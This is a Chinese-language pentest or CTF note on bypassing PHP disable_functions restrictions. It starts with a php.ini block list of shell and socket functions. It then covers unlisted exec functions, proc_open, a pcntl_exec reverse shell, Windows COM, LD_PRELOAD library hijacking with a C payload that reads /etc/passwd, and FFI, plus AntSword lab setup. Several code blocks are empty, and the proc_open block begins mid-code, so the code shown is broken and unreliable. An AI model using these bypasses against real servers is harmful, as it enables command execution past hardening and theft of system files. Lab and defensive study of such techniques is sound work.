# bypass_disable_function
---
**相关文章 & Source & Reference**
- [CTF中的命令执行绕过](https://mp.weixin.qq.com/s/fs-IKJuDptJeZMRDCtbdkw)
- [无需sendmail:巧用LD_PRELOAD突破disable_functions](https://www.freebuf.com/articles/web/192052.html)
- [php中函数禁用绕过的原理与利用](https://mp.weixin.qq.com/s/_L379eq0kufu3CCHN1DdkA)
**相关工具**
- [Medicean/as_bypass_php_disable_functions](https://github.com/Medicean/as_bypass_php_disable_functions)
- [yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD)
**相关靶场**
- [AntSwordProject/AntSword-Labs](https://github.com/AntSwordProject/AntSword-Labs)
---
**disable_function**
这个东西很明显就是什么呢，你能够代码执行了，但怎么都执行不了系统命令
实际上是开发者在后端的 php.ini 里写了如下语句
```ini
disable_functions = system,exec,shell_exec,passthru,proc_open,proc_close, proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport, syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept, socket_connect, stream_socket_server, stream_socket_accept,stream_socket_client,ftp_connect, ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space, disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd, posix_getegid,posix_geteuid,posix_getgid, posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid, posix_getppid,posix_getpwnam,posix_getpwuid, posix_getrlimit, posix_getsid,posix_getuid,posix_isatty, posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid, posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname
```
## 常规绕过
理解为查看 `PHPinfo` 看看哪些没有被写进 `ini` 配置文件, 绕过限制。
1. exec
    ```php
    ```
2. shell_exec
    ```php
    ```
3. system
    ```php
    ```
4. $command
    ```php
    ```
5. passthru
    ```php
    ```
6. popen
    ```php
    ```
7. proc_open
    ```php
    array('pipe','r'),
            1=>array('pipe','w'),
            2=>array('pipe','w')
        );
        $handle=proc_open($command,$descriptorspec,$pipes,NULL);
        if(!is_resource($handle)){
        die('proc_open failed');
        }
        while($s=fgets($pipes[1])){
        print_r($s);
        }
        while($s=fgets($pipes[2])){
        print_r($s);
        }
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($handle);
    ?>
    ```
---
## pcntl_exec
目标机器若存在 python，可用 php 执行 python 反弹 shell
```php
```
---
## 利用系统组件绕过 (win)
利用条件
- `windows环境`
- `com组件`(PHP5.4自带)(高版本扩展要自己添加)
    - `extension=php_com_dotnet.dll`
测试：
```php
exec("cmd /c".$command);  //调用对象方法来执行命令
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput;
?>
```
`?a=command`
---
## ld_preload
LD_PRELOAD 是 Linux 系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。
bypass 的关键就是利用 LD_PRELOAD 加载库优先的特点来让我们自己编写的动态链接库优先于正常的函数库，以此达成执行 system 命令。
使用条件
- Linux 操作系统
- `putenv()`
- `mail` or `error_log`
- 存在可写的目录, 需要上传 .so 文件
当 disable_functions 禁用了命令执行函数，如`shell_exec`,`system`等等。webshell 无法执行系统命令时，可以通过环境变量 LD_PRELOAD 劫持系统函数。
```c
touch test.c
vim test.c
#include 
#include 
uid_t geteuid(void){
        system("cat /etc/passwd");
}
```
生成动态链接库
```
gcc --share -fPIC test.c -o test.so
```
`LD_PRELOAD=./test.so id`
也可以传入如下 php 文件
```php
```
访问 php 文件就可以运行刚才的命令了
如果 `mail()` 函数无法使用，也可以使用 `error_log('',1)` 或者 `mb_send_mail('','','')` 和 `imap_mail("PI:EMAIL","0","1","2","3")`（如果 PHP 开启了 imap 模块）
**蚁剑靶场测试**
```
git clone https://github.com/AntSwordProject/AntSword-Labs.git
cd AntSword-Labs/bypass_disable_functions/1
docker-compose up -d
```
连接 http://127.0.0.1:18080/index.php	ant
使用“绕过 disable_functions”插件, 选择 LD_PRELOAD 模式进行
成功后可以看到目录下新建了一个 .antproxy.php 文件。我们创建副本, 并将连接的 URL shell 脚本名字改为 .antproxy.php, 就可以成功执行命令。
---
## 利用 FFI 扩展绕过
`PHP7.4` 的一个新特性 `FFI（Foreign Function Interface）`
当 PHP 所有的命令执行函数被禁用后，通过 PHP 7.4 的新特性 FFI 可以实现用 PHP 代码调用 C 代码的方式，先声明 C 中的命令执行函数，然后再通过 FFI 变量调用该 C 函数即可 `Bypass disable_functions`。
**使用条件**
- Linux 操作系统
- PHP >= 7.4
- 开启了 FFI 扩展且 `ffi.enable=true`
```ini
[ffi]
; FFI API restriction. Possible values:
; "preload" - enabled in CLI scripts and preloaded files (default)
; "false"   - always disabled
; "true"    - always enabled
ffi.enable=true
; List of headers files to preload, wildcard patterns allowed.
;ffi.preload=
```
使用 `docker` 部署服务：
```bash
apt-get install libffi-dev
docker-php-ext-install ffi
```